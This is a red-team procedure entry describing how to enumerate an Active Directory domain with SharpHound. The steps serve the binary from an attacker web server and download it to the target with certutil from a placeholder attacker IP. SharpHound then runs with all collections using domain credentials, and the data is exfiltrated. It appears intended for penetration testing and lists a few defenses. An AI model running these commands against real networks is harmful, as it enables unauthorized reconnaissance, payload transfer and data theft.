---
id: d9c6fcf5-ebc7-4439-ac83-807ec8734fae
name: Map-Active-Directory-with-SharpHound
type: procedure
verified: true
submitted: true
created_at: '2020-03-15T23:15:05.189638+00:00'
updated_at: '2023-05-25T19:44:18.124287+00:00'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Domain Trust Discovery]]'
  - '[[Permission Groups Discovery]]'
sub_techniques: []
tags:
  - active-directory
  - enumeration
commands:
  - '[[commands/launch-python3-web-server]]'
  - '[[commands/download-file-via-certutil]]'
  - '[[commands/sharphound-ingest-ad-data]]'
platforms:
  - Windows
tools:
  - '[[tools/SharpHound]]'
validated: true
---

# Map-Active-Directory-with-SharpHound

## Summary

This procedure uses SharpHound to enumerate an Active Directory environment, collecting data on users, groups, ACLs, trusts, and sessions, which is then imported into BloodHound for attack path analysis.

## Description

SharpHound is a C# ingestor that queries LDAP and RPC for AD objects, identifying misconfigurations like excessive permissions. Data is zipped for exfiltration and analysis, revealing paths to domain dominance.

## Requirements

- Domain creds for LDAP access
- Target machine with .NET (Windows)
- Attacker web server for file transfer

## Defense

- Limit LDAP queries with ACLs
- Monitor for SharpHound signatures in EDR
- Regularly audit AD permissions

## Objectives

1. Transfer SharpHound to target
2. Collect comprehensive AD data
3. Exfiltrate for analysis

## Instructions

### Step 1: Host SharpHound Binary

**Context**: Serve the exe from attacker machine.

**Command** ([[commands/launch-python3-web-server]]):
```bash
python3 -m http.server 80
```

> Place SharpHound.exe in current dir.

### Step 2: Download to Target

**Context**: Use living-off-the-land binary to fetch.

**Command** ([[commands/download-file-via-certutil]]):
```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP/SharpHound.exe" "C:\temp\SharpHound.exe"
```

### Step 3: Execute Collection

**Context**: Run with all collections enabled.

**Command** ([[commands/sharphound-ingest-ad-data]]):
```command_prompt
SharpHound.exe -c All -d $_DOMAIN --ldapusername $_USERNAME --ldappassword $_PASSWORD
```

> Outputs ZIP; exfil via upload or SMB.

**Expected Output**: 2020..._BloodHound.zip with JSON files.

## Expected Output

SharpHound Enumeration Completed! Happy Graphing!
